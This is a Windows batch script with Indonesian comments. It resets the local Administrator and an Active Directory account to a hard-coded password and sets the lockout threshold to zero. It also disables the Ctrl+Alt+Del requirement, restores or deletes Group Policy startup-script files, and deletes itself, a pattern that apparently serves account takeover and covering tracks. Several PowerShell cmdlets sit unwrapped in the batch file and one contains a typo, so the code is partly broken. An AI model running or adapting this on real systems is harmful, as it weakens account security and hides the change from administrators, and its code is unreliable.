@echo off
mode con cp select=437 >nul
setlocal enabledelayedexpansion
set USERNAME=Administrator
set NEWPASS=dabesto@15

net user %USERNAME% %NEWPASS%
powershell -NoProfile -Command "Try { net user '%USERNAME%' '%NEWPASS%'; Write-Host 'Password lokal berhasil diganti.' } Catch { Write-Host 'Gagal mengganti password lokal.' }"

:: ==== Ganti password user Active Directory (jika ada) tanpa paksa ganti saat login ====
powershell -NoProfile -Command ^
"Try { Import-Module ActiveDirectory; ^
$domain = (Get-ADDomain).DNSRoot; ^
Set-ADAccountPassword -Identity \"$domain\$env:USERNAME\" -Reset -NewPassword (ConvertTo-SecureString '%NEWPASS%' -AsPlainText -Force); ^
Write-Host 'Password AD berhasil diganti tanpa memaksa user ganti password saat login.' } ^
Catch { Write-Host 'User tidak ditemukan di AD atau terjadi error.' }"

:: ==== disable server manager ====
New-Item -Path "HKLM:\SOFTWARE\Microsoft\ServerManager" -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\ServerManager" -Name "DoNotOpenServerManagerAtLogon" -Value 1 -PropertyType DWord -Force | Out-Nul

:: ==== disable account threshold ====
cmd.exe /c "net accounts /lockoutthreshold:0 >nul 2>&1"

:: ==== ctrl alt ====
Set-ItemProperty `
    -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
    -Name "DisableCAD" `
    -Value 1


set "files[1]=%windir%\System32\GroupPolicy\gpt.ini"
set "files[2]=%windir%\System32\GroupPolicy\Machine\Scripts\scripts.ini"

for %%i in (1 2) do (
    set "ini=!files[%%i]!"
    if exist "!ini!.orig" (
        move /y "!ini!.orig" "!ini!"
    ) else (
        del "!ini!"
    )
)

del "%~f0"



















